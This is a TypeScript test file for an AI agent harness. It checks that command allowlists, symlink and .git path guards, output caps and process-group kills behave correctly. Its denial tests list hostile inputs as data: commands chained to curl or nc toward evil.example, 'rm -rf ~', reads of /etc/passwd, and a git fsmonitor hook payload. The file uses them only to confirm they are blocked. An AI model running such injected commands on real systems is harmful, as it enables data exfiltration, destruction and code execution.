// Harness tool-surface tests — PR 10 round-1 fixes 1 and 5, plus issue #18:
//   - fix 1 (HIGH): token-prefix command patterns must NOT bless shell
//     metacharacters (the exec shell interprets what the token prefix never
//     saw); anchored re: patterns are the documented escape hatch.
//   - fix 5 (MED): pre-existing symlinks pointing outside the workspace are
//     denied on read/edit (realpath re-check; the TOCTOU window stays
//     documented, not tested — it is not deterministically exercisable).
//   - issue #18: exec's maxBuffer is sized above the output cap so a noisy
//     command returns a TRUNCATED RESULT (capOutput truncates), never the
//     1 MiB default's string-code rejection dressed up as a run failure.
//
// NO EXTERNAL BINARIES (review round 3, finding 1): every ALLOWED case
// actually EXECUTES through /bin/sh, so its command must be shell BUILTINS
// only (echo / printf / exit / true / false). DENIED cases never execute —
// their command strings may name whatever the judgment is about.
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { buildTools } from '../../src/harness/tools.js';
import { defaultHarnessConfig } from '../../src/harness/config.js';
import type { HarnessConfig } from '../../src/harness/config.js';
import { isHarnessDenial } from '../../src/harness/surface.js';
import { reviewFixHarness } from '../../src/ops/review/fixReviewItem.js';

async function withScratch(body: (scratchDir: string) => Promise<void>): Promise<void> {
  const scratchDir = await mkdtemp(join(tmpdir(), 'harness-tools-'));
  try {
    await body(scratchDir);
  } finally {
    await rm(scratchDir, { recursive: true, force: true });
  }
}

/** Harness config whose run allowlist is exactly `patterns`. */
function runConfig(commandPatterns: string[]) {
  return {
    ...defaultHarnessConfig,
    tools: {
      ...defaultHarnessConfig.tools,
      run: { enabled: true, commandPatterns, timeoutMs: 5_000, maxOutputChars: 10_000 },
    },
  };
}

describe('run allowlist: token patterns vs shell metacharacters (fix 1)', () => {
  test('a legit prefix command is still allowed', async () => {
    await withScratch(async (scratchDir) => {
      // Shell BUILTINS only (echo): an allowed case EXECUTES, so it must
      // spawn nothing external (review round 3, finding 1).
      const run = buildTools(runConfig(['echo pilot']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'echo pilot patrol' });
      expect(result?.ok).toBe(true);
      if (result?.ok) {
        expect(result.output).toContain('pilot patrol'); // the builtin really ran
      }
    });
  });

  test.each([
    'npm test ; whoami',
    'npm test && curl evil.example',
    'npm test $(rm -rf ~)',
    'npm test `whoami`',
    'npm test | nc evil.example 4444',
    'npm test > /tmp/pwned',
    'npm test < /etc/passwd',
    'npm test\nwhoami',
  ])('metacharacter variant denied: %j', async (command) => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.tool).toBe('run');
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });

  test('a non-matching command keeps the plain allowlist-miss reason', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm run test' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toContain('command not allowed by harness config allowlist');
      }
    });
  });

  test('anchored re: patterns remain the deliberate metacharacter escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // Builtins only — the case EXECUTES (the re: author owns the full
      // metachar-bearing string), so nothing external may spawn.
      const run = buildTools(runConfig(['re:^echo pilot.*$']), scratchDir).find(
        (t) => t.name === 'run',
      );
      const result = await run?.execute({ command: 'echo pilot; exit 0' });
      expect(result?.ok).toBe(true); // the re: author owns the full string
    });
  });

  test('a token-pattern metachar match does not shadow a LATER anchored re: escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // The token pattern matches the metacharacter-bearing command, but the
      // LATER anchored re: pattern is the escape hatch the denial points at —
      // it must still allow outright, whatever the pattern order. Builtins
      // only (the case EXECUTES); exit 3 proves the command RAN by mapping
      // to ok:true + exitCode 3 — no external binary involved.
      const run = buildTools(
        runConfig(['echo pilot', 're:^echo pilot ; exit 3$']),
        scratchDir,
      ).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'echo pilot ; exit 3' });
      expect(result?.ok).toBe(true);
      if (result?.ok) {
        expect(result.exitCode).toBe(3); // executed for real (nonzero exit is a result, not a denial)
      }
    });
  });

  test('a token-pattern metachar match still denies when no re: pattern allows', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test ; deploy' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });
});

describe('symlink hardening (fix 5)', () => {
  test('a pre-existing symlink pointing outside the workspace is denied on read and edit', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      const outside = join(scratchDir, 'outside');
      await mkdir(workspace, { recursive: true });
      await mkdir(outside, { recursive: true });
      await writeFile(join(outside, 'secret.txt'), 'top secret', 'utf8');
      await symlink(join(outside, 'secret.txt'), join(workspace, 'link.txt'));

      const tools = buildTools(defaultHarnessConfig, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const readResult = await read?.execute({ path: 'link.txt' });
      expect(readResult?.ok).toBe(false);
      if (!readResult?.ok) {
        expect(readResult?.denial.reason).toContain('path escape');
        expect(readResult?.denial.reason).toContain('symlink');
      }

      const editResult = await edit?.execute({ path: 'link.txt', oldText: 'secret', newText: 'x' });
      expect(editResult?.ok).toBe(false);
      if (!editResult?.ok) {
        expect(editResult?.denial.reason).toContain('path escape');
        expect(editResult?.denial.reason).toContain('symlink');
      }
      // The outside file is untouched.
      await expect(read?.execute({ path: 'link.txt' })).resolves.toMatchObject({ ok: false });
    });
  });

  test('a real file inside the workspace still reads fine (no false positives)', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(workspace, { recursive: true });
      await writeFile(join(workspace, 'real.txt'), 'plain content', 'utf8');
      const read = buildTools(defaultHarnessConfig, workspace).find((t) => t.name === 'read');
      const result = await read?.execute({ path: 'real.txt' });
      expect(result?.ok).toBe(true);
    });
  });

  test('an in-workspace symlink cannot use its lexical name to bless an out-of-pattern target', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(join(workspace, 'src'), { recursive: true });
      await writeFile(join(workspace, 'secret.txt'), 'top secret', 'utf8');
      await writeFile(join(workspace, 'src', 'real.txt'), 'plain content', 'utf8');
      // src/link → ../secret.txt: INSIDE the workspace, OUTSIDE the 'src/**'
      // pattern — the lexical name matches while the I/O would land on
      // 'secret.txt', so the realpath-side allowlist check must deny.
      await symlink(join('..', 'secret.txt'), join(workspace, 'src', 'link'));

      const srcOnly: HarnessConfig = {
        ...defaultHarnessConfig,
        tools: {
          ...defaultHarnessConfig.tools,
          read: { enabled: true, pathPatterns: ['src/**'], maxOutputChars: 10_000 },
          edit: { enabled: true, pathPatterns: ['src/**'], maxOutputChars: 10_000 },
        },
      };
      const tools = buildTools(srcOnly, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const viaLink = await read?.execute({ path: 'src/link' });
      expect(viaLink?.ok).toBe(false);
      if (!viaLink?.ok) {
        expect(viaLink?.denial.reason).toBe(
          "path not allowed by harness config allowlist: 'src/link'",
        );
      }

      // Same gate on the write side.
      const editViaLink = await edit?.execute({ path: 'src/link', oldText: 'top', newText: 'x' });
      expect(editViaLink?.ok).toBe(false);
      if (!editViaLink?.ok) {
        expect(editViaLink?.denial.reason).toContain(
          'path not allowed by harness config allowlist',
        );
      }

      // The out-of-pattern target stays unreachable by its own name too…
      await expect(read?.execute({ path: 'secret.txt' })).resolves.toMatchObject({ ok: false });
      // …and the real in-pattern file still reads (no false positive).
      await expect(read?.execute({ path: 'src/real.txt' })).resolves.toMatchObject({ ok: true });
    });
  });
});

// ---------------------------------------------------------------------------
// Issue #18 — exec maxBuffer sized above the output cap: capOutput truncates,
// exec's 1 MiB default never turns noisy output into a 'run failed' denial.
// ---------------------------------------------------------------------------

describe('run output: maxBuffer sized above the cap (issue #18)', () => {
  test('a command emitting > 1 MiB returns a truncated RESULT, not a run-failed denial', async () => {
    await withScratch(async (scratchDir) => {
      // cap 600k chars → maxBuffer = 600_000 * 4 + 64KiB ≈ 2.4 MB (bytes vs
      // chars): the ~1.5 MB output fits the buffer — where exec's 1 MiB
      // DEFAULT would reject with a string-code error — and capOutput
      // truncates it. The probe is a PURE-BUILTIN /bin/sh while-loop with
      // printf (review thread: no external binary; timed in-process at
      // ~0.4 s per run, 3× consistent — far under the 2.5 s budget), so the
      // no-external-binaries convention holds with NO exception.
      const capConfig: HarnessConfig = {
        ...defaultHarnessConfig,
        tools: {
          ...defaultHarnessConfig.tools,
          run: {
            enabled: true,
            commandPatterns: ['re:^i=0; while.*cap-probe.*$'],
            timeoutMs: 30_000,
            maxOutputChars: 600_000,
          },
        },
      };
      const run = buildTools(capConfig, scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({
        command: `i=0; while [ $i -lt 11000 ]; do printf 'cap-probe line %05d ${'x'.repeat(110)}\\n' "$i"; i=$((i+1)); done`,
      });
      expect(result?.ok).toBe(true); // the old default made this a denial
      if (result?.ok) {
        expect(result.exitCode).toBe(0);
        expect(result.truncated).toBe(true);
        expect(result.output.length).toBeLessThanOrEqual(600_000);
        expect(result.output).toContain('exit 0');
      }
    });
  }, 30_000);
});

// ---------------------------------------------------------------------------
// W1.4 — `run` spawns in its OWN PROCESS GROUP; timeout and abort
// (`execute(input, { signal })`) SIGKILL the whole group, so a grandchild
// the shell forked dies with it. A kill is a RESULT
// ({ ok: true, exitCode: null, killed: true }), never a denial; only a
// failed spawn denies ('run failed: …'). These cases fork `sleep` (an
// external binary) on purpose — the group kill is the thing under test.
// ---------------------------------------------------------------------------

/** Poll `probe` until it returns a value (not undefined) or `timeoutMs` passes. */
async function pollFor<T>(probe: () => Promise<T | undefined>, timeoutMs = 10_000): Promise<T> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = await probe();
    if (value !== undefined) return value;
    if (Date.now() > deadline) throw new Error('pollFor: timed out');
    await new Promise((settle) => setTimeout(settle, 20));
  }
}

/** The pid written to `file`, once it exists and holds a full line. */
async function readPid(file: string): Promise<number> {
  return pollFor(async () => {
    const text = await readFile(file, 'utf8').catch(() => '');
    return text.endsWith('\n') ? Number(text.trim()) : undefined;
  });
}

/** True while `pid` is a live process. */
function alive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch (err) {
    return (err as NodeJS.ErrnoException).code !== 'ESRCH';
  }
}

/** Resolves once `pid` is gone; rejects after ~2 s. */
async function expectDead(pid: number): Promise<void> {
  await pollFor(async () => (alive(pid) ? undefined : true), 2_000);
}

/** A run-only config: the given patterns, timeout and cap. */
function runOnly(
  commandPatterns: string[],
  timeoutMs = 5_000,
  maxOutputChars = 10_000,
): HarnessConfig {
  return {
    ...defaultHarnessConfig,
    tools: {
      ...defaultHarnessConfig.tools,
      run: { enabled: true, commandPatterns, timeoutMs, maxOutputChars },
    },
  };
}

const GRANDCHILD = 'sleep 60 & echo $! > pid.txt; wait';
const GRANDCHILD_PATTERN = 're:^sleep 60 & echo \\$! > pid\\.txt; wait$';

describe('run: process-group cancellation (W1.4)', () => {
  test.skipIf(process.platform === 'win32')(
    'abort kills the whole group — the forked grandchild dies too',
    async () => {
      await withScratch(async (scratchDir) => {
        const run = buildTools(runOnly([GRANDCHILD_PATTERN]), scratchDir).find(
          (t) => t.name === 'run',
        );
        const controller = new AbortController();
        const pending = run?.execute({ command: GRANDCHILD }, { signal: controller.signal });
        const pid = await readPid(join(scratchDir, 'pid.txt'));
        expect(alive(pid)).toBe(true);
        controller.abort();
        const result = await pending;
        expect(result).toMatchObject({ ok: true, exitCode: null, killed: true });
        if (result?.ok) expect(result.output).toContain('killed by signal (exit null)');
        await expectDead(pid);
      });
    },
    10_000,
  );

  test.skipIf(process.platform === 'win32')(
    'timeout kills the whole group — the forked grandchild dies too',
    async () => {
      // Exec latency on a loaded host has been observed above 2 s, and the
      // grandchild must exist before the timer fires for the kill to prove
      // anything. So the timeout ESCALATES: an attempt whose shell never got
      // to write pid.txt proves nothing and is retried with a longer clock.
      for (const timeoutMs of [300, 2_000, 8_000]) {
        let pid: number | undefined;
        await withScratch(async (scratchDir) => {
          const run = buildTools(runOnly([GRANDCHILD_PATTERN], timeoutMs), scratchDir).find(
            (t) => t.name === 'run',
          );
          const result = await run?.execute({ command: GRANDCHILD });
          expect(result).toMatchObject({ ok: true, exitCode: null, killed: true });
          const text = await readFile(join(scratchDir, 'pid.txt'), 'utf8').catch(() => '');
          if (text.endsWith('\n')) pid = Number(text.trim());
        });
        if (pid !== undefined) {
          await expectDead(pid);
          return;
        }
      }
      throw new Error('the shell never started within any timeout attempt');
    },
    20_000,
  );

  test('a pre-aborted signal never spawns and reports a kill', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runOnly(['re:^echo ran > marker\\.txt$']), scratchDir).find(
        (t) => t.name === 'run',
      );
      const controller = new AbortController();
      controller.abort();
      const result = await run?.execute(
        { command: 'echo ran > marker.txt' },
        { signal: controller.signal },
      );
      expect(result).toMatchObject({ ok: true, exitCode: null, killed: true });
      await expect(readFile(join(scratchDir, 'marker.txt'), 'utf8')).rejects.toMatchObject({
        code: 'ENOENT',
      });
    });
  });

  test('a signal that never aborts leaves a normal run untouched', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runOnly(['echo']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute(
        { command: 'echo steady' },
        { signal: new AbortController().signal },
      );
      expect(result).toMatchObject({ ok: true, exitCode: 0, killed: false });
    });
  });
});

describe('run: results, output retention and spawn failure (W1.4)', () => {
  test('a nonzero exit is an ok result carrying the code, not a denial', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runOnly(['exit']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'exit 7' });
      expect(result).toEqual({
        ok: true,
        exitCode: 7,
        killed: false,
        output: 'exit 7',
        truncated: false,
      });
    });
  });

  test('stdout and stderr are both captured under their own headings', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runOnly(['re:^echo out; echo err 1>&2$']), scratchDir).find(
        (t) => t.name === 'run',
      );
      const result = await run?.execute({ command: 'echo out; echo err 1>&2' });
      expect(result).toMatchObject({ ok: true, exitCode: 0 });
      if (result?.ok) {
        expect(result.output).toBe('exit 0\n--- stdout ---\nout\n\n--- stderr ---\nerr\n');
      }
    });
  });

  test('noisy output beyond the retention bound is truncated to the cap, never denied', async () => {
    await withScratch(async (scratchDir) => {
      // cap 50 chars → retention 50*4 + 64 KiB per stream; 200 000 bytes of
      // printf output overruns the retention bound AND the cap.
      const run = buildTools(runOnly(["re:^printf '%0200000d' 0$"], 5_000, 50), scratchDir).find(
        (t) => t.name === 'run',
      );
      const result = await run?.execute({ command: "printf '%0200000d' 0" });
      expect(result).toMatchObject({ ok: true, exitCode: 0, killed: false, truncated: true });
      if (result?.ok) {
        expect(result.output).toHaveLength(50);
        expect(result.output.startsWith('exit 0\n--- stdout ---\n000')).toBe(true);
      }
    });
  });

  test('a spawn failure (missing workspace cwd) denies with run failed:', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runOnly(['echo']), join(scratchDir, 'missing')).find(
        (t) => t.name === 'run',
      );
      const result = await run?.execute({ command: 'echo nope' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.tool).toBe('run');
        expect(result?.denial.reason.startsWith('run failed: ')).toBe(true);
      }
    });
  });
});

describe('run output retention without a cap (improvement pass)', () => {
  test('an uncapped config still bounds memory: past 1 MiB per stream the output is truncated', async () => {
    await withScratch(async (scratchDir) => {
      const config = {
        ...defaultHarnessConfig,
        tools: {
          ...defaultHarnessConfig.tools,
          run: { enabled: true, commandPatterns: ['head'], timeoutMs: 20_000 },
        },
      };
      const run = buildTools(config, scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'head -c 3000000 /dev/zero' });
      expect(result?.ok).toBe(true);
      if (result?.ok !== true) return;
      expect(result.truncated).toBe(true);
      expect(result.output.length).toBeLessThan(1_200_000);
    });
  }, 30_000);
});

describe('toolkit invariant: read/edit never touch .git (W1.4 composition review F1)', () => {
  test('with the shipped reviewFixHarness, every .git path denies — gitfile, config, case/alias variants, symlinks', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'wt');
      await mkdir(join(workspace, '.git', 'hooks'), { recursive: true });
      // A linked worktree's gitfile lives at the ROOT as `.git`; model a
      // nested checkout's gitfile too (sub/.git) — both must be off-limits.
      await mkdir(join(workspace, 'sub'), { recursive: true });
      await writeFile(join(workspace, 'sub', '.git'), 'gitdir: /repo/.git/worktrees/sub\n');
      await writeFile(join(workspace, '.git', 'config'), '[core]\n\tbare = false\n');
      await writeFile(join(workspace, '.git', 'HEAD'), 'ref: refs/heads/main\n');
      await writeFile(join(workspace, '.gitignore'), 'node_modules\n');
      await writeFile(join(workspace, 'src.ts'), 'export const a = 1;\n');
      await symlink(join(workspace, '.git'), join(workspace, 'innocent'));
      const tools = buildTools(reviewFixHarness, workspace);
      const edit = tools.find((t) => t.name === 'edit');
      const read = tools.find((t) => t.name === 'read');
      const attempts = [
        { path: '.git/config', oldText: 'bare = false', newText: 'fsmonitor = sh -c evil' },
        { path: 'sub/.git', oldText: 'gitdir: /repo', newText: 'gitdir: /elsewhere' },
        { path: '.GIT/config', oldText: 'bare = false', newText: 'x' },
        { path: './src/../.git/config', oldText: 'bare = false', newText: 'x' },
        { path: 'innocent/config', oldText: 'bare = false', newText: 'x' }, // symlink → .git
      ];
      for (const input of attempts) {
        const result = await edit?.execute(input);
        expect(result?.ok, input.path).toBe(false);
        if (result?.ok !== false) continue;
        expect(result.denial.tool).toBe('edit');
        expect(result.denial.reason, input.path).toMatch(/^path not allowed: .*\.git directory/);
        expect(isHarnessDenial(result.denial.reason)).toBe(true);
      }
      const readGit = await read?.execute({ path: '.git/HEAD' });
      expect(readGit).toMatchObject({ ok: false, denial: { tool: 'read' } });
      // Nothing under .git changed…
      expect(await readFile(join(workspace, '.git', 'config'), 'utf8')).toBe(
        '[core]\n\tbare = false\n',
      );
      expect(await readFile(join(workspace, 'sub', '.git'), 'utf8')).toContain('/repo/');
      // …while ordinary files — and dot-files that merely START with .git — stay editable.
      expect(
        await edit?.execute({ path: '.gitignore', oldText: 'node_modules', newText: 'dist' }),
      ).toMatchObject({ ok: true });
      expect(
        await edit?.execute({ path: 'src.ts', oldText: 'a = 1', newText: 'a = 2' }),
      ).toMatchObject({ ok: true });
    });
  });
});
